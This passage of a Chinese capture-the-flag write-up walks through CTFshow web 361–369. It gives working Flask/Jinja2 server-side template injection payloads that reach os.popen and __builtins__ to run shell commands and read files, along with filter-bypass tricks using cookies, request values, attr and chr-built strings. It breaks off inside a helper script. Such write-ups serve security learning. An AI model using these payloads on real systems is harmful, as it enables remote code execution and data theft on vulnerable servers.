<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/2a0df7f0-de13-4cf9-bf2b-c8c28334b00c.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/2a0df7f0-de13-4cf9-bf2b-c8c28334b00c.png"></a></p>
<h2 id="toc_ctfshow"><a href="https://tttang.com/archive/1698/#toc_ctfshow">CTFSHOW</a></h2>
<h3 id="toc_web-361"><a href="https://tttang.com/archive/1698/#toc_web-361">web 361</a></h3>
<p>参数为name，尝试注入</p>
<div class="highlight"><pre><span></span><code><span class="nx">name</span><span class="o">=</span><span class="p">{{</span><span class="mi">7</span><span class="o">*</span><span class="mi">7</span><span class="p">}}</span>
</code></pre></div>

<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/4f9c861e-cb68-47e7-8225-aba96a332960.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/4f9c861e-cb68-47e7-8225-aba96a332960.png"></a><br>
存在SSTI模板注入</p>
<div class="highlight"><pre><span></span><code><span class="nx">name</span><span class="o">=</span><span class="p">{{</span><span class="nx">request</span><span class="o">.</span><span class="no">__class__</span><span class="o">.</span><span class="nx">__mro__</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="nx">__subclasses__</span><span class="p">()[</span><span class="mi">132</span><span class="p">]}}</span>
</code></pre></div>

<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/db173acc-832e-40f2-8969-649125e42284.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/db173acc-832e-40f2-8969-649125e42284.png"></a><br>
找到<code>&lt;class 'os._wrap_close'&gt;</code>，os._wrap_close类里有popen。这里直接利用popen来执行命令</p>
<div class="highlight"><pre><span></span><code><span class="p">{{</span><span class="nx">request</span><span class="o">.</span><span class="no">__class__</span><span class="o">.</span><span class="nx">__mro__</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="nx">__subclasses__</span><span class="p">()[</span><span class="mi">132</span><span class="p">]</span><span class="o">.</span><span class="nx">__init__</span><span class="o">.</span><span class="nx">__globals__</span><span class="p">[</span><span class="s1">'popen'</span><span class="p">](</span><span class="s1">'tac /flag'</span><span class="p">)</span><span class="o">.</span><span class="nx">read</span><span class="p">()}}</span>
</code></pre></div>

<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/ba951465-b8ba-4c7d-bf11-7a1a3ad6acc4.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/ba951465-b8ba-4c7d-bf11-7a1a3ad6acc4.png"></a></p>
<h3 id="toc_web-362"><a href="https://tttang.com/archive/1698/#toc_web-362">web 362</a></h3>
<p>上面的payload不管用了，这里可以用一个通用payload<br>
原理就是找到含有__builtins__的类，然后利用。</p>
<div class="highlight"><pre><span></span><code><span class="p">{{</span><span class="nx">c</span><span class="o">.</span><span class="nx">__init__</span><span class="o">.</span><span class="nx">__globals__</span><span class="p">[</span><span class="s1">'__builtins__'</span><span class="p">]</span><span class="o">.</span><span class="k">eval</span><span class="p">(</span><span class="s2">"__import__('os').popen('tac /flag').read()"</span><span class="p">)</span> <span class="p">}}</span>
</code></pre></div>

<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/5a13b746-0cde-4bc3-a01d-6e1f059ae20b.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/5a13b746-0cde-4bc3-a01d-6e1f059ae20b.png"></a><br>
也可以这样</p>
<div class="highlight"><pre><span></span><code><span class="p">{{</span><span class="nx">c</span><span class="o">.</span><span class="nx">__init__</span><span class="o">.</span><span class="nx">__globals__</span><span class="p">[</span><span class="s1">'__builtins__'</span><span class="p">]</span><span class="o">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">'/flag'</span><span class="p">,</span> <span class="s1">'r'</span><span class="p">)</span><span class="o">.</span><span class="nx">read</span><span class="p">()}}</span>
</code></pre></div>

<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/df2a5c3d-37f5-4bbc-b5f5-eab4104e4472.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/df2a5c3d-37f5-4bbc-b5f5-eab4104e4472.png"></a></p>
<h3 id="toc_web-363"><a href="https://tttang.com/archive/1698/#toc_web-363">web 363</a></h3>
<p>过滤了单引号和双引号，我们这里可以利用变量赋值，再引用变量即可<br>
args只获取地址栏中参数 ，不分get请求方式还是post请求方式.<br>
原payload</p>
<div class="highlight"><pre><span></span><code><span class="p">{{</span><span class="nx">c</span><span class="o">.</span><span class="nx">__init__</span><span class="o">.</span><span class="nx">__globals__</span><span class="p">[</span><span class="s1">'__builtins__'</span><span class="p">]</span><span class="o">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">'/flag'</span><span class="p">,</span> <span class="s1">'r'</span><span class="p">)</span><span class="o">.</span><span class="nx">read</span><span class="p">()}}</span>
</code></pre></div>

<p>经过简单修改后的payload</p>
<div class="highlight"><pre><span></span><code><span class="nx">a</span><span class="o">=</span><span class="nx">__builtins__</span><span class="o">&amp;</span><span class="nx">b</span><span class="o">=/</span><span class="nx">flag</span><span class="o">&amp;</span><span class="nx">c</span><span class="o">=</span><span class="nx">r</span><span class="o">&amp;</span><span class="nx">name</span><span class="o">=</span><span class="p">{{</span><span class="nx">c</span><span class="o">.</span><span class="nx">__init__</span><span class="o">.</span><span class="nx">__globals__</span><span class="p">[</span><span class="nx">request</span><span class="o">.</span><span class="nx">args</span><span class="o">.</span><span class="nx">a</span><span class="p">]</span><span class="o">.</span><span class="nx">open</span><span class="p">(</span><span class="nx">request</span><span class="o">.</span><span class="nx">args</span><span class="o">.</span><span class="nx">b</span><span class="p">,</span> <span class="nx">request</span><span class="o">.</span><span class="nx">args</span><span class="o">.</span><span class="nx">c</span><span class="p">)</span><span class="o">.</span><span class="nx">read</span><span class="p">()}}</span>
</code></pre></div>

<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/7efdcaab-0de7-4aba-b46c-701a4792ca20.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/7efdcaab-0de7-4aba-b46c-701a4792ca20.png"></a><br>
当然，也可以利用chr函数来进行绕过,但chr()默认是没有的需要自己去调用定义，chr()在builtins里</p>
<div class="highlight"><pre><span></span><code><span class="nx">name</span><span class="o">=</span><span class="p">{</span><span class="o">%</span> <span class="nx">set</span> <span class="nb">chr</span><span class="o">=</span><span class="nx">url_for</span><span class="o">.</span><span class="nx">__globals__</span><span class="o">.</span><span class="nx">__builtins__</span><span class="o">.</span><span class="nb">chr</span> <span class="o">%</span><span class="p">}{{</span><span class="nx">url_for</span><span class="o">.</span><span class="nx">__globals__</span><span class="p">[</span><span class="nb">chr</span><span class="p">(</span><span class="mi">111</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="nx">bchr</span><span class="p">(</span><span class="mi">115</span><span class="p">)]</span><span class="o">.</span><span class="nb">popen</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">99</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="nx">bchr</span><span class="p">(</span><span class="mi">97</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="nx">bchr</span><span class="p">(</span><span class="mi">116</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="nx">bchr</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="nx">bchr</span><span class="p">(</span><span class="mi">47</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="nx">bchr</span><span class="p">(</span><span class="mi">102</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="nx">bchr</span><span class="p">(</span><span class="mi">42</span><span class="p">))</span><span class="o">.</span><span class="nx">read</span><span class="p">()}}</span>

<span class="o">/*</span><span class="nx">原payload</span>
<span class="nx">name</span><span class="o">=</span><span class="p">{</span><span class="o">%</span> <span class="nx">set</span> <span class="nb">chr</span><span class="o">=</span><span class="nx">url_for</span><span class="o">.</span><span class="nx">__globals__</span><span class="o">.</span><span class="nx">__builtins__</span><span class="o">.</span><span class="nb">chr</span> <span class="o">%</span><span class="p">}{{</span><span class="nx">url_for</span><span class="o">.</span><span class="nx">__globals__</span><span class="p">[</span><span class="nx">o</span><span class="o">+</span><span class="nx">s</span><span class="p">]</span><span class="o">.</span><span class="nb">popen</span><span class="p">(</span><span class="nx">c</span><span class="o">+</span><span class="nx">a</span><span class="o">+</span><span class="nx">t</span><span class="o">+</span> <span class="o">+/+</span><span class="nx">f</span><span class="o">+*</span><span class="p">)</span><span class="o">.</span><span class="nx">read</span><span class="p">()}}</span>
</code></pre></div>

<h3 id="toc_web364"><a href="https://tttang.com/archive/1698/#toc_web364">web364</a></h3>
<p><code>'</code>，<code>"</code>和 <code>args</code>被ban，按理说可以用values替代args，但<br>
<a href="./FLask SSTI从零到入门 - 跳跳糖_files/29cac08d-0051-435a-b58a-7d7d82c43aa8.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/29cac08d-0051-435a-b58a-7d7d82c43aa8.png"></a><br>
回显方法不允许使用，所以这里的话还需要去另寻他法<br>
发现用 request.cookies 绕过也可以<br>
<a href="./FLask SSTI从零到入门 - 跳跳糖_files/b16a7ff1-e7a7-45ca-96fa-79b1f2409c64.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/b16a7ff1-e7a7-45ca-96fa-79b1f2409c64.png"></a></p>
<div class="highlight"><pre><span></span><code><span class="nx">name</span><span class="o">=</span><span class="p">{{</span><span class="nx">c</span><span class="o">.</span><span class="nx">__init__</span><span class="o">.</span><span class="nx">__globals__</span><span class="p">[</span><span class="nx">request</span><span class="o">.</span><span class="nx">cookies</span><span class="o">.</span><span class="nx">a</span><span class="p">]</span><span class="o">.</span><span class="nx">open</span><span class="p">(</span><span class="nx">request</span><span class="o">.</span><span class="nx">cookies</span><span class="o">.</span><span class="nx">b</span><span class="p">,</span> <span class="nx">request</span><span class="o">.</span><span class="nx">cookies</span><span class="o">.</span><span class="nx">c</span><span class="p">)</span><span class="o">.</span><span class="nx">read</span><span class="p">()}}</span>
</code></pre></div>

<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/42ddf156-5405-403b-a6be-e458948b6ff1.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/42ddf156-5405-403b-a6be-e458948b6ff1.png"></a><br>
除此之外，也可以利用chr来进行绕过<br>
payload的构造同上关即可</p>
<div class="highlight"><pre><span></span><code><span class="nx">name</span><span class="o">=</span><span class="p">{</span><span class="o">%</span> <span class="nx">set</span> <span class="nb">chr</span><span class="o">=</span><span class="nx">url_for</span><span class="o">.</span><span class="nx">__globals__</span><span class="o">.</span><span class="nx">__builtins__</span><span class="o">.</span><span class="nb">chr</span> <span class="o">%</span><span class="p">}{{</span><span class="nx">url_for</span><span class="o">.</span><span class="nx">__globals__</span><span class="p">[</span><span class="nb">chr</span><span class="p">(</span><span class="mi">111</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="nx">bchr</span><span class="p">(</span><span class="mi">115</span><span class="p">)]</span><span class="o">.</span><span class="nb">popen</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">99</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="nx">bchr</span><span class="p">(</span><span class="mi">97</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="nx">bchr</span><span class="p">(</span><span class="mi">116</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="nx">bchr</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="nx">bchr</span><span class="p">(</span><span class="mi">47</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="nx">bchr</span><span class="p">(</span><span class="mi">102</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="nx">bchr</span><span class="p">(</span><span class="mi">42</span><span class="p">))</span><span class="o">.</span><span class="nx">read</span><span class="p">()}}</span>
</code></pre></div>

<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/427e104f-de26-4a45-a025-c39f2ec6fe2f.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/427e104f-de26-4a45-a025-c39f2ec6fe2f.png"></a></p>
<h3 id="toc_web-365"><a href="https://tttang.com/archive/1698/#toc_web-365">web 365</a></h3>
<p>这里的话<code>'</code>,<code>"</code>,<code>[</code>被ban，这里仍然可以用request.cookies来进行绕过</p>
<div class="highlight"><pre><span></span><code><span class="o">?</span><span class="nx">name</span><span class="o">=</span><span class="p">{{</span><span class="nx">url_for</span><span class="o">.</span><span class="nx">__globals__</span><span class="o">.</span><span class="nx">os</span><span class="o">.</span><span class="nb">popen</span><span class="p">(</span><span class="nx">request</span><span class="o">.</span><span class="nx">cookies</span><span class="o">.</span><span class="nx">c</span><span class="p">)</span><span class="o">.</span><span class="nx">read</span><span class="p">()}}</span>
<span class="c1">//c= tac /flag</span>
</code></pre></div>

<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/e6295b8b-822c-48c1-945e-dd8e60a3ff1e.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/e6295b8b-822c-48c1-945e-dd8e60a3ff1e.png"></a></p>
<h3 id="toc_web-366"><a href="https://tttang.com/archive/1698/#toc_web-366">web 366</a></h3>
<p>这里的话过滤了_，我们可以利用过滤器attr结合request来进行绕过</p>
<div class="highlight"><pre><span></span><code><span class="p">{{(</span><span class="nx">lipsum</span><span class="o">|</span><span class="nx">attr</span><span class="p">(</span><span class="nx">request</span><span class="o">.</span><span class="nx">cookies</span><span class="o">.</span><span class="nx">a</span><span class="p">))</span><span class="o">.</span><span class="nx">os</span><span class="o">.</span><span class="nb">popen</span><span class="p">(</span><span class="nx">request</span><span class="o">.</span><span class="nx">cookies</span><span class="o">.</span><span class="nx">b</span><span class="p">)</span><span class="o">.</span><span class="nx">read</span><span class="p">()}}</span>
<span class="nx">cookies</span><span class="o">:</span><span class="nx">a</span><span class="o">=</span><span class="nx">__globals__</span><span class="o">&amp;</span><span class="nx">b</span><span class="o">=</span><span class="nx">cat</span> <span class="o">/</span><span class="nx">flag</span>
</code></pre></div>

<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/b4882dfc-0d8d-4133-8728-987267c7ecc0.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/b4882dfc-0d8d-4133-8728-987267c7ecc0.png"></a></p>
<h3 id="toc_web-367"><a href="https://tttang.com/archive/1698/#toc_web-367">web 367</a></h3>
<p>过滤多了个os，但未过滤request，那么这里可以继续用request来进行绕过<br>
本来构造的payload</p>
<div class="highlight"><pre><span></span><code><span class="p">{{(</span><span class="nx">lipsum</span><span class="o">|</span><span class="nx">attr</span><span class="p">(</span><span class="nx">request</span><span class="o">.</span><span class="nx">cookies</span><span class="o">.</span><span class="nx">a</span><span class="p">))</span><span class="o">.</span><span class="nx">request</span><span class="o">.</span><span class="nx">cookies</span><span class="o">.</span><span class="nx">c</span><span class="o">.</span><span class="nb">popen</span><span class="p">(</span><span class="nx">request</span><span class="o">.</span><span class="nx">cookies</span><span class="o">.</span><span class="nx">b</span><span class="p">)</span><span class="o">.</span><span class="nx">read</span><span class="p">()}}</span>
<span class="nx">cookies</span><span class="o">:</span><span class="nx">a</span><span class="o">=</span><span class="nx">__globals__</span><span class="o">&amp;</span><span class="nx">b</span><span class="o">=</span><span class="nx">cat</span> <span class="o">/</span><span class="nx">flag</span><span class="o">&amp;</span><span class="nx">c</span><span class="o">=</span><span class="nx">os</span>
</code></pre></div>

<p>但不知为何未正常回显，这里的话采用之前的values方式，但不用POST，通过GET进行传值时可以正常回显</p>
<div class="highlight"><pre><span></span><code><span class="nx">a</span><span class="o">=</span><span class="nx">__globals__</span><span class="o">&amp;</span><span class="nx">b</span><span class="o">=</span><span class="nx">cat</span> <span class="o">/</span><span class="nx">flag</span><span class="o">&amp;</span><span class="nx">c</span><span class="o">=</span><span class="nx">os</span><span class="o">&amp;</span><span class="nx">name</span><span class="o">=</span><span class="p">{{(</span><span class="nx">lipsum</span><span class="o">|</span><span class="nx">attr</span><span class="p">(</span><span class="nx">request</span><span class="o">.</span><span class="nx">values</span><span class="o">.</span><span class="nx">a</span><span class="p">))</span><span class="o">.</span><span class="nx">get</span><span class="p">(</span><span class="nx">request</span><span class="o">.</span><span class="nx">values</span><span class="o">.</span><span class="nx">c</span><span class="p">)</span><span class="o">.</span><span class="nb">popen</span><span class="p">(</span><span class="nx">request</span><span class="o">.</span><span class="nx">values</span><span class="o">.</span><span class="nx">b</span><span class="p">)</span><span class="o">.</span><span class="nx">read</span><span class="p">()}}</span>
</code></pre></div>

<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/6a8dec7c-4854-47b2-995d-77b1a1d89dbc.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/6a8dec7c-4854-47b2-995d-77b1a1d89dbc.png"></a></p>
<h3 id="toc_web-368"><a href="https://tttang.com/archive/1698/#toc_web-368">web 368</a></h3>
<p><code>{{}}</code>被ban，这里需要用<code>{%%}</code>来进行绕过，修改一下上关payload即可</p>
<div class="highlight"><pre><span></span><code><span class="nx">a</span><span class="o">=</span><span class="nx">__globals__</span><span class="o">&amp;</span><span class="nx">b</span><span class="o">=</span><span class="nx">cat</span> <span class="o">/</span><span class="nx">flag</span><span class="o">&amp;</span><span class="nx">c</span><span class="o">=</span><span class="nx">os</span><span class="o">&amp;</span><span class="nx">name</span><span class="o">=</span><span class="p">{</span><span class="o">%</span><span class="k">print</span><span class="p">(</span><span class="nx">lipsum</span><span class="o">|</span><span class="nx">attr</span><span class="p">(</span><span class="nx">request</span><span class="o">.</span><span class="nx">values</span><span class="o">.</span><span class="nx">a</span><span class="p">))</span><span class="o">.</span><span class="nx">get</span><span class="p">(</span><span class="nx">request</span><span class="o">.</span><span class="nx">values</span><span class="o">.</span><span class="nx">c</span><span class="p">)</span><span class="o">.</span><span class="nb">popen</span><span class="p">(</span><span class="nx">request</span><span class="o">.</span><span class="nx">values</span><span class="o">.</span><span class="nx">b</span><span class="p">)</span><span class="o">.</span><span class="nx">read</span><span class="p">()</span><span class="o">%</span><span class="p">}</span>
</code></pre></div>

<h3 id="toc_web-369"><a href="https://tttang.com/archive/1698/#toc_web-369">web 369</a></h3>
<p>request被ban，这里我们可以自己构造拼接语句来进行攻击<br>
原payload是</p>
<div class="highlight"><pre><span></span><code><span class="nx">name</span><span class="o">=</span><span class="p">{</span><span class="o">%</span><span class="nx">x</span><span class="o">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">'/flag'</span><span class="p">)</span><span class="o">.</span><span class="nx">read</span><span class="p">()</span><span class="o">%</span><span class="p">}</span>
</code></pre></div>

<p>这里由于单引号无法使用，所以我们需要自己构造/flag，构造字符串需要用到chr，也就需要调用chr函数，构造chr函数</p>
<div class="highlight"><pre><span></span><code><span class="nx">构造下划线</span>
<span class="p">{</span><span class="o">%</span> <span class="nx">set</span> <span class="nx">a</span><span class="o">=</span><span class="p">(()</span><span class="o">|</span><span class="nx">select</span><span class="o">|</span><span class="nx">string</span><span class="o">|</span><span class="k">list</span><span class="p">)</span><span class="o">.</span><span class="nx">pop</span><span class="p">(</span><span class="mi">24</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
<span class="nx">构造ini</span><span class="o">=</span><span class="s2">"___init__"</span>
<span class="p">{</span><span class="o">%</span> <span class="nx">set</span> <span class="nx">ini</span><span class="o">=</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span><span class="nx">a</span><span class="p">,</span><span class="nx">dict</span><span class="p">(</span><span class="nx">init</span><span class="o">=</span><span class="nx">a</span><span class="p">)</span><span class="o">|</span><span class="nb">join</span><span class="p">,</span><span class="nx">a</span><span class="p">,</span><span class="nx">a</span><span class="p">)</span><span class="o">|</span><span class="nb">join</span><span class="p">()</span><span class="o">%</span><span class="p">}</span>
<span class="nx">构造__globals__</span>
<span class="p">{</span><span class="o">%</span> <span class="nx">set</span> <span class="nx">glo</span><span class="o">=</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span><span class="nx">a</span><span class="p">,</span><span class="nx">dict</span><span class="p">(</span><span class="nx">globals</span><span class="o">=</span><span class="nx">a</span><span class="p">)</span><span class="o">|</span><span class="nb">join</span><span class="p">,</span><span class="nx">a</span><span class="p">,</span><span class="nx">a</span><span class="p">)</span><span class="o">|</span><span class="nb">join</span><span class="p">()</span><span class="o">%</span><span class="p">}</span>
<span class="nx">构造geti</span><span class="o">=</span><span class="s2">"__getitem__"</span>
<span class="p">{</span><span class="o">%</span> <span class="nx">set</span> <span class="nx">geti</span><span class="o">=</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span><span class="nx">a</span><span class="p">,</span><span class="nx">dict</span><span class="p">(</span><span class="nx">getitem</span><span class="o">=</span><span class="nx">a</span><span class="p">)</span><span class="o">|</span><span class="nb">join</span><span class="p">,</span><span class="nx">a</span><span class="p">,</span><span class="nx">a</span><span class="p">)</span><span class="o">|</span><span class="nb">join</span><span class="p">()</span><span class="o">%</span><span class="p">}</span>
<span class="nx">构造built</span><span class="o">=</span><span class="s2">"__builtins__"</span>
<span class="p">{</span><span class="o">%</span> <span class="nx">set</span> <span class="nx">built</span><span class="o">=</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span><span class="nx">a</span><span class="p">,</span><span class="nx">dict</span><span class="p">(</span><span class="nx">builtins</span><span class="o">=</span><span class="nx">a</span><span class="p">)</span><span class="o">|</span><span class="nb">join</span><span class="p">,</span><span class="nx">a</span><span class="p">,</span><span class="nx">a</span><span class="p">)</span><span class="o">|</span><span class="nb">join</span><span class="p">()</span><span class="o">%</span><span class="p">}</span>
<span class="nx">调用chr</span><span class="p">()</span><span class="nx">函数</span>
<span class="p">{</span><span class="o">%</span> <span class="nx">set</span> <span class="nx">x</span><span class="o">=</span><span class="p">(</span><span class="nx">q</span><span class="o">|</span><span class="nx">attr</span><span class="p">(</span><span class="nx">ini</span><span class="p">)</span><span class="o">|</span><span class="nx">attr</span><span class="p">(</span><span class="nx">glo</span><span class="p">)</span><span class="o">|</span><span class="nx">attr</span><span class="p">(</span><span class="nx">geti</span><span class="p">))(</span><span class="nx">built</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span> <span class="nx">set</span> <span class="nb">chr</span><span class="o">=</span><span class="nx">x</span><span class="o">.</span><span class="nb">chr</span><span class="o">%</span><span class="p">}</span>
<span class="nx">构造</span><span class="o">/</span><span class="nx">flag</span>
<span class="p">{</span><span class="o">%</span> <span class="nx">set</span> <span class="nx">flag</span><span class="o">=</span><span class="nb">chr</span><span class="p">(</span><span class="mi">47</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="nx">bchr</span><span class="p">(</span><span class="mi">102</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="nx">bchr</span><span class="p">(</span><span class="mi">108</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="nx">bchr</span><span class="p">(</span><span class="mi">97</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="nx">bchr</span><span class="p">(</span><span class="mi">103</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span><span class="k">print</span><span class="p">(</span><span class="nx">x</span><span class="o">.</span><span class="nx">open</span><span class="p">(</span><span class="nx">flag</span><span class="p">)</span><span class="o">.</span><span class="nx">read</span><span class="p">())</span><span class="o">%</span><span class="p">}</span>
</code></pre></div>

<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/452e0efa-110d-407c-81aa-f507843aea56.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/452e0efa-110d-407c-81aa-f507843aea56.png"></a></p>
<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/47e49c5b-327f-4c9e-94cd-2fec8504690a.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/47e49c5b-327f-4c9e-94cd-2fec8504690a.png"></a><br>
最终payload</p>
<div class="highlight"><pre><span></span><code><span class="nx">name</span><span class="o">=</span>
<span class="p">{</span><span class="o">%</span> <span class="nx">set</span> <span class="nx">a</span><span class="o">=</span><span class="p">(()</span><span class="o">|</span><span class="nx">select</span><span class="o">|</span><span class="nx">string</span><span class="o">|</span><span class="k">list</span><span class="p">)</span><span class="o">.</span><span class="nx">pop</span><span class="p">(</span><span class="mi">24</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span> <span class="nx">set</span> <span class="nx">ini</span><span class="o">=</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span><span class="nx">a</span><span class="p">,</span><span class="nx">dict</span><span class="p">(</span><span class="nx">init</span><span class="o">=</span><span class="nx">a</span><span class="p">)</span><span class="o">|</span><span class="nb">join</span><span class="p">,</span><span class="nx">a</span><span class="p">,</span><span class="nx">a</span><span class="p">)</span><span class="o">|</span><span class="nb">join</span><span class="p">()</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span> <span class="nx">set</span> <span class="nx">glo</span><span class="o">=</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span><span class="nx">a</span><span class="p">,</span><span class="nx">dict</span><span class="p">(</span><span class="nx">globals</span><span class="o">=</span><span class="nx">a</span><span class="p">)</span><span class="o">|</span><span class="nb">join</span><span class="p">,</span><span class="nx">a</span><span class="p">,</span><span class="nx">a</span><span class="p">)</span><span class="o">|</span><span class="nb">join</span><span class="p">()</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span> <span class="nx">set</span> <span class="nx">geti</span><span class="o">=</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span><span class="nx">a</span><span class="p">,</span><span class="nx">dict</span><span class="p">(</span><span class="nx">getitem</span><span class="o">=</span><span class="nx">a</span><span class="p">)</span><span class="o">|</span><span class="nb">join</span><span class="p">,</span><span class="nx">a</span><span class="p">,</span><span class="nx">a</span><span class="p">)</span><span class="o">|</span><span class="nb">join</span><span class="p">()</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span> <span class="nx">set</span> <span class="nx">built</span><span class="o">=</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span><span class="nx">a</span><span class="p">,</span><span class="nx">dict</span><span class="p">(</span><span class="nx">builtins</span><span class="o">=</span><span class="nx">a</span><span class="p">)</span><span class="o">|</span><span class="nb">join</span><span class="p">,</span><span class="nx">a</span><span class="p">,</span><span class="nx">a</span><span class="p">)</span><span class="o">|</span><span class="nb">join</span><span class="p">()</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span> <span class="nx">set</span> <span class="nx">x</span><span class="o">=</span><span class="p">(</span><span class="nx">q</span><span class="o">|</span><span class="nx">attr</span><span class="p">(</span><span class="nx">ini</span><span class="p">)</span><span class="o">|</span><span class="nx">attr</span><span class="p">(</span><span class="nx">glo</span><span class="p">)</span><span class="o">|</span><span class="nx">attr</span><span class="p">(</span><span class="nx">geti</span><span class="p">))(</span><span class="nx">built</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span> <span class="nx">set</span> <span class="nb">chr</span><span class="o">=</span><span class="nx">x</span><span class="o">.</span><span class="nb">chr</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span> <span class="nx">set</span> <span class="nx">flag</span><span class="o">=</span><span class="nb">chr</span><span class="p">(</span><span class="mi">47</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="nx">bchr</span><span class="p">(</span><span class="mi">102</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="nx">bchr</span><span class="p">(</span><span class="mi">108</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="nx">bchr</span><span class="p">(</span><span class="mi">97</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="nx">bchr</span><span class="p">(</span><span class="mi">103</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span><span class="k">print</span><span class="p">(</span><span class="nx">x</span><span class="o">.</span><span class="nx">open</span><span class="p">(</span><span class="nx">flag</span><span class="p">)</span><span class="o">.</span><span class="nx">read</span><span class="p">())</span><span class="o">%</span><span class="p">}</span>
</code></pre></div>

<p>附赠一个字符串转换为chr小脚本</p>
<div class="highlight"><pre><span></span><code><span class="n">i</span><span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">"输入字符串:"</span><span class="p">)</span>
<span class="n">flag</span><span class="o">=</span><span class="s2">""</span>
<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">i</span><span class="p">:</span>
    <span class="n">c</span><span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
    <span class="n">b</span><span class="o">=</span><span class="s2">"chr(</span><span class="si">%d</span><span class="s2">)"</span> <span class="o">%</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
    <span class="n">flag</span> <span class="o">+=</span><span class="n">b</span><span class="o">+</span><span class="s1">'%2b'</span>
